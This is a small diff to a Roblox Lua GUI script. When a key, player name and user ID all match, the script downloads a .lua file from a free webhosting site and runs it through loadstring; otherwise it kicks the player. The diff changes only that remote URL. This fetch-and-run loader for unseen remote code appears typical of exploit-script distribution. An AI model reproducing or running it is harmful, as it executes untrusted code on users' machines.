@@ -56,7 +56,7 @@ TextButton.TextWrapped = true
 TextButton.MouseButton1Down:Connect(function()
 if keyin.Text == "KeyHere" and game.Players.LocalPlayer.Name == "NameHere" and game.Players.LocalPlayer.UserId == IDHere then
     Frame.Visible = false
-    loadstring(game:HttpGet('https://admin-hosting1.000webhostapp.com/hwfqwfqefwegwegwegwegw.lua'))()
+    loadstring(game:HttpGet('https://admin-hosting1.000webhostapp.com/wfqwfqefwegwegwegwegw.lua'))()
     else
     game.Players.LocalPlayer:Kick("Wrong key or account, verification failed.")
     end
